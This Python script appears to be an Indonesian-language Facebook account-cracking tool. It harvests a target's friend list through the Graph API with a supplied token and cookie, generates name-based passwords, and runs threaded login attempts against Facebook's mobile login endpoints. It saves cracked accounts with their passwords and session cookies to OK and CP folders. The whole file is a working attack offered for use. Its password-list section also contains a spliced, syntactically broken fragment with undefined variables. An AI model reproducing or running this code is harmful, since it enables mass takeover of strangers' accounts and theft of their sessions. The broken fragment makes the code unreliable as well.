		Login_Dulu(

		)

	Bersih(

		)

	Banner(

	)

	Colom1 = [

]

	Colom1.append(

		Panel(

			f"[bold #FF00D4]id: {uids_fb}",

			width=23,

			style="bold purple",

		)

	)

	Colom1.append(

		Panel(

			f"[bold #FF00D4]nama: {nama_fb}",

			width=24,

			style="bold purple",

		)

	)

	Console(width=48).print(

		Columns(

			Colom1

			),

		justify="center"

	)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]input menu (1/2)",

			style="bold purple",

			),

		justify="center"

	)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]1.dump friendlist    2.cek hasil ok cp",

			width=48,

			subtitle="╭──",

			subtitle_align="left",

			style="bold purple",

			),

		justify="center"

	)

	Pilih = Console().input(

		"[bold purple]   ╰─> "

	)

	if Pilih in ("1"):

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]input id target",

				width=48,

				subtitle="╭──",

				subtitle_align="left",

				style="bold purple",

				),

			justify="center"

		)

		idt = Console().input(

			"[bold purple]   ╰─> "

			)

		Start_Dump(idt, "", {"cookie": cok}, token)

		Sortir_Idz(

		)

	elif Pilih in ("2"):

		Hasil_OkCp(

		)

	else:

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]macam tak betul budek ni",

				width=48,

				style="bold purple",

				),

			justify="center"

		)

	sleep(

		2

		)

	exit(

	)

def Start_Dump(idt, fields, cookie, token):

	ses = requests.Session()

	try:

		head = {

			"connection": "keep-alive",

			"accept": "*/*",

			"sec-fetch-dest": "empty",

			"sec-fetch-mode": "cors",

			"sec-fetch-site": "same-origin",

			"sec-fetch-user": "?1",

			"sec-ch-ua-mobile": "?1",

			"upgrade-insecure-requests": "1",

			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",

			"accept-encoding": "gzip, deflate",

			"accept-language": "id-ID,id;q=0.9",

			}

		if len(id) == 0:

			param = {

				"access_token": token,

				"fields": f"name,friends.fields(id,name,birthday)",

			}

		else:

			param = {

				"access_token": token,

				"fields": f"name,friends.fields(id,name,birthday).after({fields})",

			}

		url = ses.get(

			f"https://graph.facebook.com/{idt}",

			params=param,

			headers=head,

			cookies=cookie,

		).json()

		for i in url["friends"]["data"]:

			id.append(i["id"] + "|" + i["name"])

			print(f"       ╰─> sedang mengumpulkan {len(id)} id         ",end="\r")

		Start_Dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)

	except :

		pass

def Sortir_Idz():

	if len(id) == 0:

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]id privat/ttl -18th",

				style="bold purple",

				),

			justify="center"

			)

		exit(

		)

	muda = [

]

	for bacot in sorted(id):

		muda.append(

			bacot

		)

	bcm = len(

		muda

	)

	bcmi = (

		bcm-1

		)

	for xmud in range(bcm):

		id2.append(

			muda[

				bcmi

			]

		)

		bcmi -=1

	Console(width=48).print(

		Panel(

			f"[bold #FF00D4]terkumpul {len(id)} id",

			style="bold purple",

			),

		justify="center"

		)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]tambah kata sandi (y/t)",

			width=48,

			subtitle="╭──",

			subtitle_align="left",

			style="bold purple",

			),

		justify="center"

		)

	pwa = Console().input(

		"[bold purple]   ╰─> "

		)

	if pwa in ["y", "Y"]:

		pwp.append(

			"bade"

			)

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]example: password,facebook,rahasia",

				width=48,

				subtitle="╭──",

				subtitle_align="left",

				style="bold purple",

				),

			justify="center"

			)

		pwn = Console().input(

			"[bold purple]   ╰─> "

			)

		pwk = pwn.split(

			","

			)

		for xpw in pwk:

			pwt.append(

				xpw

			)

	else:

		pwp.append(

			"moal"

		)

	Eksekusi(

	)

def Eksekusi():

	global prog, des

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]mode pesawat per 300 id",

			width=48,

			subtitle="[bold #FF00D4]* <[bold purple][underline]hasil akun ok dan cp tersimpan di[/underline][bold #FF00D4]> *",

			style="bold purple",

			),

		justify="center"

	)

	Colom2 = [

]

	Colom2.append(

		Panel(

			f"[bold #00FF00] {okc}",

			width=23,

			style="bold purple",

		)

	)

	Colom2.append(

		Panel(

			f"[bold #FFFF00] {cpc}",

			width=24,

			style="bold purple",

		)

	)

	Console(width=48).print(

		Columns(

			Colom2

			),

		justify="center"

	)

	prog = Progress(

		SpinnerColumn(

			'clock'

		),

		TimeElapsedColumn(

		),

		TextColumn(

			'{task.percentage:.0f}%'

		),

		TextColumn(

			'{task.description}'

		),

		# BarColumn(

		# )

	)

	des = prog.add_task(

		'',

		total = len(

			id2

		)

	)

	with prog:

		with Trd(max_workers=30) as MethodCrack:

			for mxv in id2:

				user = mxv.split(

					'|'

					)[

					0

				]

				nmfl = mxv.split(

					'|'

					)[

					1

				].lower()

				namd = nmfl.split(

					' '

					)[

					0

				]

				namx = nmfl.replace(

					' ',

					''

				)

				pasw = [

					'kamu nanya',

					'kamunanya',

					'kata sandi'

				]

				if len(nmfl) and len(namx) < 6:

					if len(namd) < 3:

						pass

					else:

						pasw.append(

							nmfl

						)

						pasw.append(

							namx

						)

						pasw.append(

							namd

							+

							namd

						)

						pasw.append(

							namd

							+

							' '

							+

							namd

						)

						pasw.append(

							namd

							+

							'12'

						)

						pasw.append(

							namd

							+

							'123'

						)

						pasw.append(

							namd

							+

							'1234'

						)

						pasw.append(

							namd

							+

							'12345'

						)

						pasw.append(

							namd

							+

							'123456'

						)

				else:

					if len(namd) < 3:

						pasw.append(

							nmfl

							)

						pasw.append(

							namx

						)

					else:

						pasw.append(

							nmfl

							)

						pasw.append(

							namx

						)

						pasw.append(

							namd

							+

							namd

						)

						pasw.append(

							namd

							+

							' '

							+

							namd

						)

						pasw.append(

							namd

							+

							'12'

						)

						pasw.append(

							namd

							+

							'123'

						)

						pasw.append(

							namd

							+

							'1234'

						)

						pasw.append(

							namd

							+

							'12345'

						)

						pasw.append(

							namd

							+

							'123456'

				    	)

						pasw.append(

							namd

							+

						  '@'
						)

						pasw.append(

							namd

							+

							'@#$'
							)

						pasw.append(

							namd

							+

							'@#$_&+_?*'
							)

						pasw.append(

							namd

							+

							'@#$_&-+()/'
							)

						pasw.append(

							namd

							+

							'@#$_&-+()/*":;!?.,'
		  else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						pwx.append(frestile+'00')
						pwx.append(frestile+'000')
                	if 'bade' in pwp:

					for xpwd in pwt:

						pasw.append(

							xpwd

						)

				else:

					pass

				MethodCrack.submit(

					Valid,

					user,

					pasw,

					nmfl

				)

		print(

		)

	Console(width=48).print(

		Panel(

			f'[bold #FF00D4]crack selesai akun ok: [bold #00FF00]{ok} [bold #FF00D4]akun cp: [bold #FFFF00]{cp}',

			width=48,

			style=f"bold purple"

			),

		justify="center"

		)

	exit(

	)

def Konversi(cookie):

	kueh = (

		'datr=%s;sb=%s;ps_l=0;ps_n=0;c_user=%s;xs=%s;fr=%s'

		%

		(

			cookie[

				'datr'

			],

			cookie[

				'sb'

			],

			cookie[

				'c_user'

			],

			cookie[

				'xs'

			],

			cookie[

				'fr'

			]

		)

	)

	return(

		str(

			kueh

		)

	)

def Valid(user,pasw,nmfl):

	global loop,ok,cp

	prog.update(des,description=f"[bold #FF00D4]{loop}[bold #FFFFFF]=[bold #FF00D4]{len(id)} [bold ##FFFFFF]{user} [bold #FFFFFF]ok:[bold #80FF00]{ok}[bold #FFFFFF] cp:[bold #FFFF00]{cp}[/]")

	prog.advance(des)

	for pw in pasw:

		try:

			ses = requests.Session(); ua = User_Agent()

			# xxx = open('p.txt','r').read().splitlines()

			# zzz = {'http': 'socks5://'+random.choice(xxx)}

			url = (f'{rc(["free","mbasic","m"])}.prod.facebook.com')

			bhs = rc(['id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'bd-BD,bd;q=0.9,en-US;q=0.8,en;q=0.7', 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7', 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'])

			link = ses.get("https://"+url+"/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2F"+url+"%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")

			date = {

				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),

				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),

				"uid": user,

				"next": "https://"+url+"/login/save-device/",

				"flow": "login_no_pin",

				"pass": pw,}

			kueh = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])

			head = {

				'Host': url,

				'cache-control': 'max-age=0',

				'upgrade-insecure-requests': '1',

				'origin': 'https://'+url,

				'content-type': 'application/x-www-form-urlencoded',

				'x-requested-with': 'XMLHttpRequest',

				'user-agent': ua,

				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

				'sec-fetch-site': 'same-origin',

				'sec-fetch-mode': 'navigate',

				'sec-fetch-user': '?1',

				'sec-fetch-dest': 'document',

				'dpr': str(rr(1,5)),

				'viewport-width': str(rr(300,999)),

				'sec-ch-ua': '"Not)A;Brand";v="{}", "Chromium";v="{}"'.format(str(rr(8,24)), re.search(r'Chrome/(\d+)', str(ua)).group(1)),

				'sec-ch-ua-mobile': '?1',

				'sec-ch-ua-platform': '"Android"',

				'sec-ch-ua-platform-version': '"{}.0.0"'.format(re.search(r'Android (\d+)', ua).group(1)),

				'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Chromium";v="{}"'.format(str(rr(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua)).group(1)),

				'sec-ch-prefers-color-scheme': 'dark',

				'referer': link.url,

				'accept-encoding': 'gzip, deflate, br',

				'accept-language': bhs,}

			sign = ses.post('https://'+url+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',

				data = date,

				headers = head,

				cookies = {

					'cookie'

					:

					kueh

				},

				allow_redirects = False)

			if "checkpoint" in ses.cookies.get_dict():

				tree = Tree(

					"",

					guide_style="bold purple"

				)

				true = tree.add(

					Panel(

						"[bold #FFFF00]login akun facebook cekpoint",

						subtitle="* ᴅᴀᴛᴀ *",

						subtitle_align="left",

						width=32,

						style="bold purple"

					)

				).add(

					f"[bold #FFFF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"

					,style="bold purple"

				)

				true.add(

					f"[bold #FFFF00]ɴɴ: [#FFFFFF]{nmfl}",

					style="bold purple"

				)

				true.add(

					f"[bold #FFFF00]ɪᴅ: [#FFFFFF]{user}",

					style="bold purple"

				)

				true.add(

					f"[bold #FFFF00]ᴘᴡ: [#FFFFFF]{pw}",

					style="bold purple"

				)

				true = tree.add(

					Panel(

						f"[bold #FF00D4]{ua}",

						title="* ᴜɢᴇɴ *",

						title_align="left",

						width=84,style="bold purple"

					)

				)

				true.add(

					Panel(

						"[bold #FFFF00]silahkan check di lite/mbasic barangkali opsi checkpointnya dapat dibuka!",

						title="* ɪɴғᴏ *",

						title_align="left",

						width=80,

						style="bold purple"

					)

				)

				Cetak(

					tree

				)

				open(

					'CP/'

					+

					cpc,

					'a'

					).write(

					user

					+

					'|'

					+

					pw

					+

					'\n'

				)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict():

				kuki = Konversi(

					ses.cookies.get_dict()

				)

				tree = Tree(

					"",

					guide_style="bold purple"

				)

				true = tree.add(

					Panel(

						"[bold #00FF00]login akun facebook berhasil",

						subtitle="* ᴅᴀᴛᴀ *",

						subtitle_align="left",

						width=32,

						style="bold purple"

					)

				).add(

					f"[bold #00FF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"

					,style="bold purple"

				)

				true.add(

					f"[bold #00FF00]ɴɴ: [#FFFFFF]{nmfl}",

					style="bold purple"

				)

				true.add(

					f"[bold #00FF00]ɪᴅ: [#FFFFFF]{user}",

					style="bold purple"

				)

				true.add(

					f"[bold #00FF00]ᴘᴡ: [#FFFFFF]{pw}",

					style="bold purple"

				)

				true = tree.add(

					Panel(

						f"[bold #FF00D4]{ua}",

						title="* ᴜɢᴇɴ *",

						title_align="left",

						width=84,style="bold purple"

					)

				)

				true.add(

					Panel(

						f"[bold #00FF00]{kuki}",

						title="* ᴋᴜᴇʜ *",

						title_align="left",

						width=80,

						style="bold purple"

					)

				)

				Cetak(

					tree

				)

				open(

					'OK/'

					+

					okc,

					'a'

					).write(

					user

					+

					'|'

					+

					pw

					+

					'|'

					+

					kuki

					+

					'|'

					+

					ua

					+

					'\n'

				)

				ok+=1

				break

			else: continue

		except (requests.exceptions.ConnectionError): sleep(30)

	loop +=1

def Hasil_OkCp():

	Colom3 = [

	]

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]menu cek hasil crack",

			style="bold purple",

			),

		justify="center"

		)

	Colom3.append(

		Panel(

			"[bold #FF00D4] 1.hasil ok",

			width=15,

			style="bold purple",

		)

	)

	Colom3.append(

		Panel(

			"[bold #FF00D4] 2.hasil cp",

			width=16,

			style="bold purple",

		)

	)

	Colom3.append(

		Panel(

			"[bold #FF00D4] 3.kembali",

			width=15,

			style="bold purple",

		)

	)

	Console(width=48).print(

		Columns(

			Colom3

			),

		justify="center"

	)

	Console(width=48).print(

		Panel(

			'[bold #FF00D4]input menu (1/2/3)',

			width=48,

			subtitle="╭──",

			subtitle_align="left",

			style="bold purple"

			),

		justify="center"

	)

	Choose = Console().input(

		'[bold purple]   ╰─> '

		)

	if Choose in ('1'):

		try:

			Cari = os.listdir(

				'OK'

			)

		except FileNotFoundError:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]file tidak ada",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			sleep(

				3

				)

			Back_Menu(

			)

		if len(Cari) == 0:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]file kosong, crack dahulu",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			sleep(

				2

				)

			Back_Menu(

			)

		else:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]daftar hasil akun ok anda",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			Htg = 0

			Fns = {}

			for Data in Cari:

				try:

					Isi = open('OK/'+Data,'r').readlines()

				except:

					continue

				Htg+=1

				if Htg < 10:

					Nom = (

						''

						+

						str(

							Htg

						)

					)

					Fns.update(

						{

							str(

								Htg

							)

							:

							str(

								Data

							)

						}

					)

					Fns.update(

						{

							Nom

							:

							str(

								Data

							)

						}

					)

					Console().print(

						'[bold #FF00D4] ➛ [#FFFFFF]0'

						+

						Nom

						+

						'[#FFFFFF]. '

						+

						Data

						+

						'[bold #00FF00] '

						+

						str(

							len(

								Isi

							)

						)

						+

						'[#FFFFFF] akun'

					)

				else:

					Fns.update(

						{

							str(

								Htg

							)

							:

							str(

								Data

							)

						}

					)

					Console().print(

						'[bold #FF00D4] ➛ [#FFFFFF]'

						+

						str(

							Htg

						)

						+

						'. '

						+

						Data

						+

						'[bold #00FF00] '

						+

						str(

							len(

								Isi

							)

						)

						+

						'[#FFFFFF] akun'

					)

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]input nomer daftar hasil diatas",

					width=48,

					subtitle="╭──",

					subtitle_align="left",

					style="bold purple"

					),

				justify="center"

			)

			View = Console().input(

				'[bold purple]   ╰─> '

				)

			try:

				Liat = Fns[

					View

				]

			except KeyError:

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]macam tak betul budek ni",

						width=48,

						style="bold purple"

						),

					justify="center"

				)

				sleep(

					2

					)

				Back_Menu(

				)

			try:

				Cari2 = open(

					'OK/'

					+

					Liat,

					'r'

				).read().splitlines()

			except:

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]file tidak ada",

						width=48,

						style="bold purple"

						),

					justify="center"

				)

				sleep(

					2

					)

				Back_Menu(

				)

			HtgCp = 0

			for Cpku in range(len(Cari2)):

				Cpny = Cari2[

					HtgCp

					].split('|')

				tree = Tree(

					""

				)

				tree.add(

					"\r[bold #00FF00]Account Succesfully"

					).add(

					f"\r[bold purple]{Cpny[0]}|{Cpny[1]}"

					).add(

					f"\r[bold purple]{Cpny[2]}"

					,style="bold white"

				)

				tree.add(

					f"\r[white]{Cpny[3]}"

					,style="bold #00FF00"

				)

				Cetak(

					tree

				)

				HtgCp +=1

			print(

				''

			)

			Console(width=48).print(

				Panel(

					'[bold #FF00D4]cek selesai, enter untuk ke menu',

					width=48,

					subtitle="╭──",

					subtitle_align="left",

					style="bold purple"

					),

				justify="center"

			)

			Console().input(

				'[bold purple]   ╰─> '

				)

			Back_Menu(

			)

	elif Choose in ('2'):

		try:

			Cari = os.listdir(

				'CP'

			)

		except FileNotFoundError:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]file tidak ada",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			sleep(

				3

				)

			Back_Menu(

			)

		if len(Cari) == 0:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]file kosong, crack dahulu",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			sleep(

				2

				)

			Back_Menu(

			)

		else:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]daftar hasil akun cp anda",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			Htg = 0

			Fns = {}

			for Data in Cari:

				try:

					Isi = open('CP/'+Data,'r').readlines()

				except:

					continue

				Htg+=1

				if Htg < 10:

					Nom = (

						''

						+

						str(

							Htg

						)

					)

					Fns.update(

						{

							str(

								Htg

							)

							:

							str(

								Data

							)

						}

					)

					Fns.update(

						{

							Nom

							:

							str(

								Data

							)

						}

					)

					Console().print(

						'[bold #FF00D4] ➛ [bold #FFFFFF]0'

						+

						Nom

						+

						'[#FFFFFF]. '

						+

						Data

						+

						'[bold #FFF000] '

						+

						str(

							len(

								Isi

							)

						)

						+

						'[#FFFFFF] akun'

					)

				else:

					Fns.update(

						{

							str(

								Htg

							)

							:

							str(

								Data

							)

						}

					)

					Console().print(

						'[bold #FF00D4] ➛ [#FFFFFF]'

						+

						str(

							Htg

						)

						+

						'. '

						+

						Data

						+

						'[bold #FFF000] '

						+

						str(

							len(

								Isi

							)

						)

						+

						'[#FFFFFF] akun'

					)

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]input nomer daftar hasil diatas",

					width=48,

					subtitle="╭──",

					subtitle_align="left",

					style="bold purple"

					),

				justify="center"

			)

			View = Console().input(

				'[bold purple]   ╰─> '

			)

			try:

				Liat = Fns[

					View

				]

			except KeyError:

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]macam tak betul budek ni",

						width=48,

						style="bold purple"

						),

					justify="center"

				)

				sleep(

					2

					)

				Back_Menu(

				)

			try:

				Cari2 = open(

					'CP/'

					+

					Liat,

					'r'

				).read().splitlines()

			except:

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]file tidak ada",

						width=48,

						style="bold purple"

						),

					justify="center"

				)

				sleep(

					2

					)

				Back_Menu(

				)

			HtgCp = 0

			for Cpku in range(len(Cari2)):

				Cpny = Cari2[

					HtgCp

					].split('|')

				tree = Tree("")

				tree.add(

					"\r[bold #FFFF00]Account Checkpoint"

					).add(

					f"\r[bold #FF0000]{Cpny[0]}|{Cpny[1]}"

					,style="bold #FFF000"

				)

				Cetak(

					tree

				)

				HtgCp +=1

			print(

				''

			)

			Console(width=48).print(

				Panel(

					'[bold #FF00D4]cek selesai, enter untuk ke menu',

					width=48,

					subtitle="╭──",

					subtitle_align="left",

					style="bold purple"

					),

				justify="center"

			)

			Console().input(

				'[bold purple]   ╰─> '

				)

			Back_Menu(

			)

	elif Choose in ('3'):

		Back_Menu(

		)

	else:

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]macam tak betul budek ni",

				width=48,

				style="bold purple"

				),

			justify="center"

		)

		sleep(

			1

			)

		exit(

	)

if __name__=='__main__':

	try:

		os.mkdir(

			'OK'

		)

	except:

		pass

	try:

		os.mkdir(

			'CP'

		)

	except:

		pass

	Main_Menu(

)